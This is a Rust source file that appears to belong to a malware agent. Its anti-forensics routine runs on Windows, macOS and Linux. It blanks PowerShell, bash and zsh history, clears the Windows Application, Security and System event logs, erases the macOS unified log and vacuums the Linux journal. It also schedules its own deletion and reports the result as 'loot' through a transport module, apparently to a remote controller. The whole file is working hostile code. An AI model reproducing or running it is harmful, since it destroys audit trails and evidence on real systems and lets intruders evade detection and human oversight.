#![cfg_attr(target_os = "windows", windows_subsystem = "windows")]

use agent::transport;
use serde_json::json;

fn main() {
    let wiped = wipe_traces();
    let payload = json!({
        "timestamp": unix_now(),
        "type": "wipe",
        "items_wiped": wiped,
    });
    // best-effort send before self-deletion
    transport::post_loot(&payload);
}

#[cfg(target_os = "windows")]
fn wipe_traces() -> u32 {
    use std::process::Command;
    let mut count = 0u32;
    let profile = std::env::var("USERPROFILE").unwrap_or_default();
    let hist = format!(
        "{profile}\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadLine\\ConsoleHost_history.txt"
    );
    if std::fs::write(&hist, "").is_ok() {
        count += 1;
    }
    for log in &["Application", "Security", "System"] {
        if Command::new("wevtutil")
            .args(["cl", log])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            count += 1;
        }
    }
    // schedule self-deletion after process exits
    let exe = std::env::current_exe()
        .map(|p| format!("{}", p.display()))
        .unwrap_or_default();
    let _ = Command::new("cmd")
        .args(["/c", &format!("timeout /t 2 >/dev/null & del /f /q \"{exe}\"")])
        .spawn();
    count
}

#[cfg(target_os = "macos")]
fn wipe_traces() -> u32 {
    use std::process::Command;
    let mut count = 0u32;
    let home = std::env::var("HOME").unwrap_or_default();
    for hist in &[".bash_history", ".zsh_history"] {
        if std::fs::write(format!("{home}/{hist}"), "").is_ok() {
            count += 1;
        }
    }
    if Command::new("log")
        .args(["erase", "--all"])
        .output()
        .map(|o| o.status.success())
        .unwrap_or(false)
    {
        count += 1;
    }
    let exe = std::env::current_exe()
        .map(|p| format!("{}", p.display()))
        .unwrap_or_default();
    let _ = Command::new("sh")
        .args(["-c", &format!("sleep 2 && rm -f '{exe}'")])
        .spawn();
    count
}

#[cfg(target_os = "linux")]
fn wipe_traces() -> u32 {
    use std::process::Command;
    let mut count = 0u32;
    let home = std::env::var("HOME").unwrap_or_default();
    for hist in &[".bash_history", ".zsh_history"] {
        if std::fs::write(format!("{home}/{hist}"), "").is_ok() {
            count += 1;
        }
    }
    if Command::new("journalctl")
        .args(["--rotate"])
        .output()
        .is_ok()
    {
        if Command::new("journalctl")
            .args(["--vacuum-time=1s"])
            .output()
            .map(|o| o.status.success())
            .unwrap_or(false)
        {
            count += 1;
        }
    }
    let exe = std::env::current_exe()
        .map(|p| format!("{}", p.display()))
        .unwrap_or_default();
    let _ = Command::new("sh")
        .args(["-c", &format!("sleep 2 && rm -f '{exe}'")])
        .spawn();
    count
}

fn unix_now() -> u64 {
    std::time::SystemTime::now()
        .duration_since(std::time::UNIX_EPOCH)
        .map(|d| d.as_secs())
        .unwrap_or(0)
}
